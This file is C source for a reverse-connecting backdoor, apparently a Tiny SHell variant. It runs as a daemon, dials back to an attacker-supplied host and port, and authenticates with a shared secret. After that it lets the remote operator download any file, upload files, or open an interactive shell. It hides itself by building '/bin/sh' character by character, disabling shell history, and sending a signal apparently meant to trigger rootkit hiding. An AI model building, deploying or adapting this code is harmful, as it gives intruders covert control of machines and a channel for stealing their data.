#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <pty.h>

#include "config.h"
#include "pel.h"

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;
short int connect_back_port = 0;
char *connect_back_host = NULL;
char *secret = PASS;

void usage(char *argv0) {
    	fprintf(stderr, "Usage: %s [ -t connect_back_host ] [ -p port ] [ -r delay (optional) ] [ -s secret (optional) ]\n", argv0);
   	exit(1);
}

int get_file(int client) {
    	int ret, len, fd;

    	ret = pel_recv_msg(client, message, &len);

    	if(ret != PEL_SUCCESS) return(ERROR);

    	message[len] = '\0';

    	fd = open((char *) message, O_RDONLY);

    	if(fd < 0) return(ERROR);

    	while(1) {
        	len = read(fd, message, BUFSIZE);

        	if(len == 0) break;
		if(len < 0) return(ERROR);

        	ret = pel_send_msg(client, message, len);

        	if(ret != PEL_SUCCESS) return(ERROR);
    	}
    	return(0);
}

int put_file(int client) {
    	int ret, len, fd;

    	ret = pel_recv_msg(client, message, &len);

    	if(ret != PEL_SUCCESS) return(ERROR);

    	message[len] = '\0';
    	fd = creat((char *) message, 0644);

    	if(fd < 0) return(ERROR);

    	while(1) {
        	ret = pel_recv_msg(client, message, &len);

        	if(ret != PEL_SUCCESS) {
            		if(pel_errno == PEL_CONN_CLOSED) break;

            		return(ERROR);
        	}

        	if(write( fd, message, len ) != len) return(ERROR);
    	}
    	return(0);
}

int runshell(int client) {
    	fd_set rd;
    	struct winsize ws;
    	char *slave, *temp, *shell;
    	int ret, len, pid, pty, tty, n;

    	if(openpty( &pty, &tty, NULL, NULL, NULL ) < 0) return(ERROR);

    	slave = ttyname(tty);

    	if(slave == NULL) return(ERROR);
    
    	ret = chdir(HOMEDIR);
    	temp = (char *) malloc(10);

    	if(temp == NULL) return(ERROR);

    	temp[0] = 'H'; temp[5] = 'I';
    	temp[1] = 'I'; temp[6] = 'L';
    	temp[2] = 'S'; temp[7] = 'E';
    	temp[3] = 'T'; temp[8] = '=';
    	temp[4] = 'F'; temp[9] = '\0';

    	putenv(temp);

    	ret = pel_recv_msg(client, message, &len);

    	if(ret != PEL_SUCCESS) return(ERROR);

    	message[len] = '\0';
    	temp = (char *) malloc(len + 6);

    	if(temp == NULL) return(ERROR);

    	temp[0] = 'T';
    	temp[1] = 'E';
    	temp[2] = 'R';
    	temp[3] = 'M';
    	temp[4] = '=';

    	strncpy(temp + 5, (char *) message, len + 1);
    	putenv(temp);

    	ret = pel_recv_msg(client, message, &len);

    	if(ret != PEL_SUCCESS || len != 4) return(ERROR);

    	ws.ws_row = ((int) message[0] << 8) + (int) message[1];
    	ws.ws_col = ((int) message[2] << 8) + (int) message[3];
    	ws.ws_xpixel = 0;
    	ws.ws_ypixel = 0;

    	if(ioctl(pty, TIOCSWINSZ, &ws) < 0) return(ERROR);

    	ret = pel_recv_msg(client, message, &len);

    	if(ret != PEL_SUCCESS) return(ERROR);

    	message[len] = '\0';
    	temp = (char *) malloc(len + 1);

    	if(temp == NULL) return(ERROR);

    	strncpy(temp, (char *) message, len + 1);

    	pid = fork();

    	if(pid < 0) return(ERROR);

    	if(pid == 0) {
        	close(client);
        	close(pty);

        	if(setsid() < 0) return(ERROR);

        	if(ioctl(tty, TIOCSCTTY, NULL) < 0) return(ERROR);

        	dup2(tty, 0);
        	dup2(tty, 1);
        	dup2(tty, 2);

        	if(tty > 2) close(tty);

        	shell = (char *) malloc(8);

        	if(shell == NULL) return(ERROR);

        	shell[0] = '/'; shell[4] = '/';
        	shell[1] = 'b'; shell[5] = 's';
        	shell[2] = 'i'; shell[6] = 'h';
        	shell[3] = 'n'; shell[7] = '\0';

		execl(shell, shell + 5, "-c", temp, (char *) 0);

        	return(0);
    	} else {
        	close(tty);

        	while(1) {
            		FD_ZERO(&rd);
            		FD_SET(client, &rd);
            		FD_SET(pty, &rd);

            		n = (pty > client) ? pty : client;

            		if(select(n + 1, &rd, NULL, NULL, NULL) < 0) return(ERROR);

            		if(FD_ISSET(client, &rd)) {
                		ret = pel_recv_msg(client, message, &len);

                		if(ret != PEL_SUCCESS) return(ERROR);
                		if(write( pty, message, len ) != len) return(ERROR);
            		}

            		if(FD_ISSET(pty, &rd)) {
                		len = read(pty, message, BUFSIZE);

                		if(len == 0) break;
                		if(len < 0) return(ERROR);

                		ret = pel_send_msg(client, message, len);

                		if(ret != PEL_SUCCESS) return(ERROR);
            		}
        	}
        	return(0);
    	}
}

int main( int argc, char **argv ) {
    	int ret, len, pid, opt, client, delay = 0;
    	struct sockaddr_in client_addr;
    	struct hostent *client_host;
    	socklen_t n;

    	while ((opt = getopt(argc, argv, "t:s:p:r:h")) != -1) {
        	switch (opt) {
	    	case 't':
			connect_back_host = optarg;
			break;
            	case 'p':
                	connect_back_port = atoi(optarg);
                	if (!connect_back_port) usage(*argv);
                	break;
            	case 's':
                	secret = optarg;
                	break;
		case 'r':
			delay = atoi(optarg);
 			break;
	    	case 'h':
			usage(*argv);
			break;
            	default:
			usage(*argv);
                	break;
        	}
    	}

    	if(connect_back_host == NULL || connect_back_port == 0) usage(*argv);

    	//strcpy(argv[0], "[ata/0]");
    	kill(getpid(), 49);

    	pid = fork();

    	if(pid < 0) return(ERROR);
    	if(pid != 0) return(0);

   	if(setsid() < 0) {
        	perror("socket");
        	return(ERROR);
    	}

    	for(n = 0; n < 1024; n++) close(n);

	do {
		if(delay > 0) sleep(delay);
connect:
    		client = socket(AF_INET, SOCK_STREAM, 0);
		if(client < 0) continue;
    		client_host = gethostbyname(connect_back_host);
		if(client_host == NULL) continue;

    		memcpy((void *) &client_addr.sin_addr, (void *) client_host->h_addr, client_host->h_length);

    		client_addr.sin_family = AF_INET;
    		client_addr.sin_port   = htons(connect_back_port);

    		ret = connect(client, (struct sockaddr *) &client_addr, sizeof(client_addr));

    		if(ret < 0) {
			close(client);
			continue;
		}

    		pid = fork();

    		if(pid < 0) {
			close(client);
			continue;
		}

    		if(pid != 0) {
        		waitpid( pid, NULL, 0 );
        		close( client );
    			continue;
		}

    		pid = fork();

    		if(pid < 0) return(ERROR);
    		if(pid != 0) return(0);

    		alarm(3);

    		ret = pel_server_init(client, secret);

    		if(ret != PEL_SUCCESS) { 
        		shutdown(client, 2);
			return ERROR;
    		}

    		alarm(0);

    		ret = pel_recv_msg(client, message, &len);

    		if(ret != PEL_SUCCESS || len != 1) {
        		shutdown(client, 2);
        		return(ERROR);
    		}

    		switch(message[0]) {
        		case GET_FILE:
            			ret = get_file(client);
            			break;
        		case PUT_FILE:
            			ret = put_file(client);
            			break;
        		case RUNSHELL:
            			ret = runshell(client);
            			break;
        		default:
            			ret = 12;
            			break;
    		}

    		shutdown(client, 2);
		return ret;
	} while (delay > 0);

	return(0);
}
